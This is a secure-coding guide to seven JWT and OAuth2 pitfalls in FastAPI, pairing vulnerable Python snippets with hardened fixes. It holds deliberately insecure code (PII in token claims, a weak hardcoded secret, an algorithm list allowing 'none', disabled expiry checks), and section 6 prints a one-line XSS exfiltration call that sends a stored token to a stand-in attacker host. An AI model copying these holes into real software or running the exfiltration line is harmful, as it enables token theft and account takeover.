# Critical Antipatterns & Pitfalls in OAuth2, JWT Authentication & Scopes

This document analyzes the 7 most destructive security vulnerabilities and architectural antipatterns encountered when implementing OAuth2, JWT authentication, and scope-based authorization in production FastAPI systems. Each pitfall details the concrete failure mechanism, reproducible bad vs. good code, and enterprise remediation protocols.

---

## 1. Storing Sensitive Credentials or Unencrypted PII in JWT Payloads

### Failure Mechanism
A JSON Web Token (JWT) is composed of Base64URL-encoded JSON segments (`Header.Payload.Signature`). **JWTs are cryptographically signed, NOT encrypted.** Anyone who intercepts the token in transit, inspects HTTP access logs, inspects browser developer tools, or extracts it from proxy cache headers can immediately decode and read the plaintext payload without knowing the secret or private key.

Placing sensitive Personally Identifiable Information (PII) such as Social Security Numbers, credit card numbers, internal network topologies, or password hashes into token claims causes immediate compliance violations (GDPR, HIPAA, PCI-DSS) and catastrophic data exposure.

### Vulnerable Implementation
```python
# CRITICAL VULNERABILITY: Plaintext sensitive credentials exposed in JWT payload
from datetime import datetime, timezone, timedelta
import jwt

SECRET_KEY = "enterprise_secret_key"

def create_insecure_token(user: dict) -> str:
    payload = {
        "sub": user["id"],
        "email": user["email"],
        "ssn": user["ssn"],                       # Critical PII breach
        "credit_card": user["credit_card"],       # PCI-DSS violation
        "password_hash": user["hashed_password"], # Facilitates offline cracking
        "exp": datetime.now(timezone.utc) + timedelta(hours=1),
    }
    # Base64URL encoded - readable by anyone!
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")
```

### Production Remediation
Tokens must strictly adhere to the principle of minimal claims. Only include standard identity references (`sub`), authorization grants (`scopes`), token lifecycle metadata (`exp`, `iat`, `jti`), and non-sensitive tenant IDs. All rich profile data must be fetched server-side from a secure data store or Redis cache using the authenticated `sub`.

```python
from datetime import datetime, timezone, timedelta
import secrets
import jwt

SECRET_KEY = "enterprise_secret_key"

def create_secure_token(user_id: str, scopes: list[str]) -> str:
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,                              # Unique identifier only
        "scopes": scopes,                            # Authorized capabilities
        "iat": int(now.timestamp()),                # Issued at
        "exp": int((now + timedelta(minutes=15)).timestamp()), # Short-lived
        "jti": secrets.token_hex(16),               # Unique token ID for revocation
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")
```

---

## 2. Hardcoding Weak, Predictable HMAC Secrets (Offline Brute-Force Vulnerability)

### Failure Mechanism
HMAC-based algorithms (`HS256`, `HS384`, `HS512`) rely entirely on the entropy of the symmetric shared secret. When developers hardcode short, human-readable secrets (e.g., `"secret"`, `"fastapi-secret-key"`, `"company2024"`), an attacker who captures a single valid JWT can run high-speed offline dictionary or GPU brute-force attacks using tools like Hashcat or John the Ripper.

Modern consumer GPUs can test over 2 billion HS256 hashes per second. Once the secret is cracked, the attacker can forge valid tokens for any user identifier, grant themselves root/superuser scopes, and completely bypass authentication without triggering any server-side rate limits or audit logs.

### Vulnerable Implementation
```python
# CRITICAL VULNERABILITY: Weak, hardcoded secret vulnerable to GPU dictionary attacks
SECRET_KEY = "my_secret_key_123"  # Cracked by Hashcat in < 0.05 seconds

def issue_token(user_id: str) -> str:
    return jwt.encode({"sub": user_id}, SECRET_KEY, algorithm="HS256")
```

### Production Remediation
Enforce a minimum of 256 bits (32 bytes) of cryptographic randomness. Secret keys must be loaded exclusively from secure environment variables, cloud secrets managers (AWS Secrets Manager, HashiCorp Vault), and validated during application startup. PyJWT 2.13+ automatically raises `InsecureKeyLengthWarning` if symmetric keys fall below 32 bytes.

```python
import os
import sys
from pydantic_settings import BaseSettings

class AuthSettings(BaseSettings):
    jwt_secret_key: str
    jwt_algorithm: str = "HS256"

    def validate_key_entropy(self) -> None:
        if len(self.jwt_secret_key.encode("utf-8")) < 32:
            raise ValueError(
                "CRITICAL SECURITY CONFIGURATION: jwt_secret_key must provide "
                "at least 32 bytes (256 bits) of entropy to prevent offline brute-force attacks."
            )

# Generate cryptographically secure keys via CLI:
# python -c "import secrets; print(secrets.token_hex(32))"
```

---

## 3. Algorithm Confusion & `alg: "none"` Header Injection

### Failure Mechanism
The JWT specification (RFC 7519) allows multiple algorithms, including an unsecured `"none"` algorithm. Early JWT libraries accepted any algorithm declared in the unverified token header (`alg`). Attackers exploit this in two devastating ways:
1. **`alg: "none"` Attack**: An attacker modifies the payload to grant admin permissions, changes the header to `{"alg": "none"}`, strips the signature, and sends the token. If the server does not enforce cryptographic algorithms, it accepts the forged token as valid.
2. **Asymmetric-to-Symmetric Key Confusion (RS256 vs. HS256)**: When an application uses RS256, the public key is publicly accessible (via JWKS). An attacker creates a forged token, sets `{"alg": "HS256"}`, and signs it using the server's **RS256 public key** as the HMAC secret key. If the server verifies tokens using `jwt.decode(token, key, algorithms=["HS256", "RS256"])`, the verifier treats the public key string as an HMAC secret, successfully verifying the forged signature!

### Vulnerable Implementation
```python
# CRITICAL VULNERABILITY: Allowing algorithm negotiation and missing algorithm whitelist
import jwt

def verify_token_vulnerable(token: str, verification_key: str):
    # PyJWT older versions or permissive configurations allow header-directed decoding
    # If key is an RSA public key, an attacker signing with HS256 will pass!
    return jwt.decode(
        token, 
        verification_key, 
        algorithms=["HS256", "RS256", "none"], # Mixed asymmetric/symmetric + none
        options={"verify_signature": True}
    )
```

### Production Remediation
Explicitly specify exactly **one** permitted algorithm in the decoding whitelist. Never allow dynamic algorithm selection or mix symmetric (`HS256`) and asymmetric (`RS256`) verifiers in the same decoding pipeline. Modern PyJWT strictly prohibits `"none"` unless explicitly enabled via options.

```python
import jwt
from fastapi import HTTPException, status

PERMITTED_ALGORITHM = "RS256"

def verify_token_secure(token: str, public_key_pem: bytes) -> dict:
    try:
        # Strict whitelist: Only RS256 accepted. Attacker HS256 forgery will fail immediately.
        payload = jwt.decode(
            token,
            public_key_pem,
            algorithms=[PERMITTED_ALGORITHM],
            options={"require": ["exp", "iat", "sub"]}
        )
        return payload
    except jwt.InvalidAlgorithmError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Unauthorized cryptographic algorithm declaration",
            headers={"WWW-Authenticate": "Bearer"},
        )
    except jwt.PyJWTError as exc:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=f"Token verification failed: {str(exc)}",
            headers={"WWW-Authenticate": "Bearer"},
        )
```

---

## 4. Omitting Expiration (`exp`) or Failing to Validate Token Expiry

### Failure Mechanism
Stateless JWTs cannot be invalidated by standard database updates unless a revocation mechanism is maintained. If a token is issued without an `exp` (expiration time) claim or if the server disables expiration validation (`options={"verify_exp": False}`), the token becomes valid **indefinitely**.

If an attacker intercepts this token through a corporate proxy, misconfigured CORS endpoint, server access logs, or an insecure client cache, they possess permanent access to the user's account with no mechanism to expire or timeout the session.

### Vulnerable Implementation
```python
# CRITICAL VULNERABILITY: No exp claim or disabled exp verification
import jwt

def issue_eternal_token(user_id: str, secret: str) -> str:
    # No 'exp' claim is set! Token never expires.
    payload = {"sub": user_id, "role": "admin"}
    return jwt.encode(payload, secret, algorithm="HS256")

def decode_without_exp(token: str, secret: str) -> dict:
    # Disabling expiration check allows stale/leaked tokens to authenticate forever
    return jwt.decode(token, secret, algorithms=["HS256"], options={"verify_exp": False})
```

### Production Remediation
Enforce mandatory expiration claims on every issued token. Set access token lifetimes to short durations (e.g., 10 to 30 minutes). Enforce `require: ["exp"]` during validation and use a modest clock skew `leeway` (e.g., 10 seconds) to handle NTP drift across distributed nodes without opening security windows.

```python
from datetime import datetime, timezone, timedelta
import jwt

ACCESS_TOKEN_LIFETIME = timedelta(minutes=15)
CLOCK_LEEWAY_SECONDS = 10

def create_expiring_token(user_id: str, secret: str) -> str:
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,
        "iat": int(now.timestamp()),
        "exp": int((now + ACCESS_TOKEN_LIFETIME).timestamp()),
    }
    return jwt.encode(payload, secret, algorithm="HS256")

def verify_expiring_token(token: str, secret: str) -> dict:
    return jwt.decode(
        token,
        secret,
        algorithms=["HS256"],
        leeway=CLOCK_LEEWAY_SECONDS,
        options={"require": ["exp", "iat", "sub"]}
    )
```

---

## 5. Confusing OAuth2 Scopes with Application Roles (RBAC vs Delegated Access)

### Failure Mechanism
A frequent architectural blunder is treating OAuth2 **Scopes** as synonymous with **Roles**.
- **Roles (RBAC)**: Represent *who the user is* and what their enterprise identity is permitted to do across the entire domain (e.g., `Admin`, `BillingManager`, `SupportAgent`).
- **Scopes (OAuth2)**: Represent *what authorization the user delegates to a client application*. Scopes define granular capabilities (e.g., `read:reports`, `write:invoices`, `offline_access`).

When developers use scopes like `scope="admin"` or check `if "admin" in security_scopes.scopes`, they destroy the delegation model. If a third-party calendar client authenticates on behalf of an Admin user, granting the client `admin` scope allows the calendar client to delete production databases, create new root users, and wipe billing records!

### Vulnerable Implementation
```python
# ARCHITECTURAL ANTIPATTERN: Using scopes as coarse-grained user roles
from fastapi import Depends, HTTPException, Security, status
from fastapi.security import SecurityScopes

def require_admin(security_scopes: SecurityScopes, user = Depends(get_current_user)):
    # Flawed design: Scope is treated as role, permitting any client application
    # authorized with "admin" to execute arbitrary administrative actions.
    if "admin" not in user.scopes:
        raise HTTPException(status_code=403, detail="Admin scope required")
```

### Production Remediation
Separate User Roles from Client Scopes. An endpoint requires specific **functional scopes** (e.g., `users:read`, `users:write`). During token issuance, the token's granted scopes are the **intersection** of the user's role permissions and the client application's requested scopes.

```python
from fastapi import Depends, HTTPException, Security, status
from fastapi.security import OAuth2PasswordBearer, SecurityScopes

oauth2_scheme = OAuth2PasswordBearer(
    tokenUrl="auth/token",
    scopes={
        "users:read": "Read user account details and directory listings.",
        "users:write": "Create, modify, and delete user profiles.",
        "reports:export": "Generate and export financial and operational reports.",
    }
)

def verify_scope_entitlement(
    security_scopes: SecurityScopes,
    token_payload: dict = Depends(decode_jwt_token)
) -> dict:
    granted_scopes = set(token_payload.get("scopes", []))
    for required_scope in security_scopes.scopes:
        if required_scope not in granted_scopes:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail=f"Insufficient permissions: Missing scope '{required_scope}'",
                headers={"WWW-Authenticate": f'Bearer error="insufficient_scope", scope="{required_scope}"'},
            )
    return token_payload

# Endpoints request specific action capabilities, not broad user identities
@app.get("/users/me", dependencies=[Security(verify_scope_entitlement, scopes=["users:read"])])
async def get_user_profile():
    return {"status": "authorized"}
```

---

## 6. Storing JWT Access Tokens in Browser `localStorage` (XSS Exposure)

### Failure Mechanism
Storing JWTs in browser `localStorage` or `sessionStorage` makes them completely accessible to any client-side JavaScript execution via `window.localStorage.getItem("token")`.

If your application suffers from a single Cross-Site Scripting (XSS) vulnerability—or if any third-party npm package, analytics script, chat widget, or ad pixel in your supply chain is compromised—attackers can silently extract all stored JWTs and transmit them to external command-and-control servers, hijacking active sessions without triggering CORS or CSP warnings.

### Vulnerable Client/Server Flow
```javascript
// CRITICAL CLIENT-SIDE ANTIPATTERN:
// Any malicious XSS injection extracts this token in one line:
fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));
```

### Production Remediation
Implement the **BFF (Backend-For-Frontend) or Secure Cookie Pattern**:
1. Store long-lived Refresh Tokens in `HttpOnly`, `Secure`, `SameSite=Strict` cookies. `HttpOnly` completely prevents client-side JavaScript from reading the cookie, neutralizing XSS exfiltration.
2. Maintain short-lived Access Tokens in client application **memory only** (e.g., Vue/React state, closure variable, or Web Worker). When the page refreshes, the app transparently calls `/auth/refresh` via the `HttpOnly` cookie to retrieve a fresh short-lived in-memory token.

```python
from fastapi import FastAPI, Response, status

app = FastAPI()

@app.post("/auth/login")
async def login(response: Response, user_credentials: UserCredentials):
    access_token, refresh_token = authenticate_user(user_credentials)
    
    # Refresh token stored in hardened HttpOnly cookie: Immune to JS XSS exfiltration
    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        httponly=True,       # Prevents JavaScript document.cookie access
        secure=True,         # Transmitted exclusively over HTTPS
        samesite="strict",   # Neutralizes Cross-Site Request Forgery (CSRF)
        max_age=7 * 86400,   # 7 days
        path="/auth/refresh" # Cookie sent only to token refresh endpoint
    )
    
    # Access token returned in JSON body to be held in client memory only
    return {"access_token": access_token, "token_type": "bearer", "expires_in": 900}
```

---

## 7. Pure Stateless Blind Trust: Zero Token Revocation Capabilities

### Failure Mechanism
A pure stateless JWT architecture verifies tokens exclusively by calculating mathematical signature validity (`verify(token, public_key)`). Under this naive model, the server does not consult any state or cache.

If a user:
- Reports their laptop or phone stolen,
- Changes their password following a credential leak,
- Has their administrative privileges revoked by an HR offboarding action,
- Or clicks "Log Out of All Devices",

Their existing tokens remain **100% valid and accepted by all services** until their natural `exp` timestamp elapses! In enterprise environments with hour- or day-long token lifetimes, this creates an intolerable security window.

### Vulnerable Implementation
```python
# VULNERABLE DESIGN: Blind mathematical trust with no revocation check
def verify_user_request(token: str):
    # Only checks signature and expiration math
    # User could have been terminated 30 minutes ago, but token is blindly accepted!
    payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
    return payload["sub"]
```

### Production Remediation
Implement a **Hybrid Stateless/Stateful Revocation Strategy**:
1. **Short Access Token Lifetimes**: 10 to 15 minutes limit the residual exposure window.
2. **Distributed Redis Blocklist / Revocation Epoch**:
   - Each token includes a unique `jti` (JWT ID). When a user logs out, the `jti` is pushed to Redis with a TTL equal to the token's remaining lifetime.
   - Alternatively, store a `token_version` or `password_changed_at` epoch on the user's account cache. During verification, if `token.iat < user.password_changed_at`, reject the token immediately.

```python
from datetime import datetime, timezone
from fastapi import Depends, HTTPException, status
import jwt
import redis.asyncio as aioredis

redis_client = aioredis.from_url("redis://localhost:6379/0", decode_responses=True)

async def verify_token_with_revocation(
    token: str = Depends(oauth2_scheme)
) -> dict:
    payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    jti = payload.get("jti")
    
    # 1. Fast O(1) in-memory blocklist check
    if jti and await redis_client.exists(f"token_blocklist:{jti}"):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Token has been revoked",
            headers={"WWW-Authenticate": "Bearer error=\"invalid_token\""},
        )
        
    # 2. User account status / epoch check
    user_id = payload["sub"]
    user_epoch_str = await redis_client.get(f"user_revocation_epoch:{user_id}")
    if user_epoch_str:
        user_epoch = int(user_epoch_str)
        token_iat = payload.get("iat", 0)
        if token_iat < user_epoch:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Session invalidated due to password reset or global logout",
                headers={"WWW-Authenticate": "Bearer error=\"invalid_token\""},
            )
            
    return payload
```

---

## Architectural Summary Matrix

| Pitfall | Security Impact | Primary Vector | Enterprise Remediation |
| :--- | :--- | :--- | :--- |
| **PII in Payload** | Critical (GDPR/HIPAA breach) | Plaintext Base64URL | Minimal claims (`sub`, `jti`, `scopes`); fetch details server-side |
| **Weak HMAC Secret** | Critical (Complete forgery) | GPU Hashcat brute-force | 256-bit cryptographic entropy via environment / Vault |
| **Algorithm Confusion** | Critical (Signature bypass) | `alg: "none"` or HS256/RS256 mismatch | Strict single-algorithm whitelist; separate asymmetric keys |
| **Missing Expiration** | High (Perpetual access) | Stolen / intercepted tokens | Short-lived `exp` (15m), strict verification options |
| **Scopes vs Roles** | High (Privilege escalation) | Overprivileged client apps | Decouple identity roles from delegated capability scopes |
| **localStorage Storage** | High (Session theft) | XSS payload exfiltration | `HttpOnly` SameSite cookies for refresh, memory-only for access |
| **No Revocation** | High (Uncontrollable sessions) | Leaked tokens / offboarding | Distributed Redis `jti` blocklist + user revocation epoch |
